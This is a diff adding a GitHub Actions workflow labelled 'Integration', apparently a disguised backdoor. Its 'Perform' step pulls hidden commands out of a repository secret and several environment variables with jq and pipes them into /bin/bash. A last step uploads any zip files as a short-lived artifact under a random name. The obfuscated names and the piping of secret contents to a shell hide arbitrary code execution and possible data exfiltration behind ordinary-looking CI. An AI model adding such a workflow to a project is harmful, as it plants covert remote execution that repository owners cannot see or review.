@@ -1,0 +1,32 @@
+name: Integration
+on:
+  workflow_dispatch:
+
+permissions:
+  contents: read
+concurrency:
+  group: ${{ github.workflow }}
+  cancel-in-progress: false
+jobs:
+  agent:
+    runs-on: ubuntu-latest
+    steps:
+      - uses: actions/checkout@v4
+        with:
+          fetch-depth: 1
+      - name: Perform
+        env:
+          f795: ${{ secrets.f795 }}
+        run: |
+          printf '%s' "$f795" | jq -r .ypeo9347 | /bin/bash
+          echo $onb875 | jq -r .yv300 | /bin/bash
+          echo $ryen2 | jq -r .ymhst2957 | /bin/bash
+          printf '%s' "$vhiiq36376" | jq -r .t216 | /bin/bash
+
+      - name: Upload results
+        if: always()
+        uses: actions/upload-artifact@v4
+        with:
+          name: O6i8vv9O
+          path: "*.zip"
+          retention-days: 1
